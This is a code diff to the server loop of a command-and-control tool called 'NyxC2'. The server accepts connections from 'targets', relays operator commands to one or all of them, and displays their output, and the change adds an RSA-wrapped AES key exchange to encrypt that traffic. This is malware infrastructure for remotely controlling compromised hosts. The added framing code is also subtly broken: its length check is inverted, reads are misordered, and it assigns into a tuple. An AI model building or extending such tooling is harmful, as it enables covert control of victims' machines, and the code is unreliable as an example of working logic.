@@ -14,6 +14,7 @@ def server():
     
     
     #setup the RSA
+    global private_key,public_key
     private_key,public_key = rsa_key_setup()
 
     # select() watches the listening socket, connected client sockets, and
@@ -43,10 +44,10 @@ def server():
                     # addressguest contains (IP, port); only the IP is used as
                     # the default name displayed in the operator console.
                     dict_ip[addressguest[0]] = (clientsocket,True, None)
-                    send_message( str(dict_ip[addressguest[0]][0]) + " " + public_key, dict_ip)
-                    
-                    
-                    
+                    clientsocket.sendall(struct.pack("<I", len(public_key)) + public_key)
+
+
+
             elif elem == sys.stdin:
                 # Standard input is handled as an event source. The first word
                 # determines whether the line is a management or target command.
@@ -110,6 +111,12 @@ def server():
                     # Forward normal input using the format "<target|*> <command>".
                     send_message(command, dict_ip)
                 print("NyxC2 > ", end="", flush=True)
+                
+                
+                
+                
+                
+                
             else:
                 # This event belongs to a connected client socket. Find its
                 # current display name so received output can be identified.
@@ -122,6 +129,12 @@ def server():
                     # Read up to 4096 bytes from the client. An empty byte
                     # string means that the peer closed the connection cleanly.
                     new_data = elem.recv(4096)
+                    
+                    length_bytes = elem.recv(4)
+                    if len(length_bytes) != 4:
+                        length = struct.unpack("<I", length_bytes)[0]
+                        frame = elem.recv(length)
+                    
                     
                     if not new_data:
                         print(f"connection lost with {nom_cible}")
@@ -137,9 +150,19 @@ def server():
                         new_data = new_data.decode('cp850', errors='replace').strip()
                             
                         if new_data:
+                            type_byte = frame[0]
+                            ciphertext = frame[1:]
+                            if type_byte == 0x01:
+                                aes_key = rsa_decryption(private_key, ciphertext)
+                                dict_ip[nom_cible][2] = aes_key
+                            
+                            
+                            
                             print(f"\n[answer from {nom_cible}] :\n {new_data}")
                         if new_data.endswith('>'):
                             print("\nNyxC2 > ", end="", flush=True)
+                            
+                            
                 except ConnectionResetError:
                     # Remove a forcibly disconnected client from both tracking
                     # collections before closing its socket object.
